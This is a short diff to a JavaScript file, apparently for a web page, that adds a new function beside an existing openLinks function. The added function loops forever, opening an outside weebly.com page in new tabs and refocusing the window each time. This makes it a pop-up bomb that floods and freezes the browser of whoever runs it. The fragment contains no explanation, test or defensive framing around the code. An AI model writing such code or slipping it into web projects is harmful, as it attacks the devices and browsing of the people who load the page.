@@ -52,3 +52,10 @@ function openLinks(){
      window.focus();
    }
   }
+
+  function shit(){
+    while(true){
+      window.open("https://harvisha.weebly.com",'_blank');
+      window.focus();
+    }
+   }
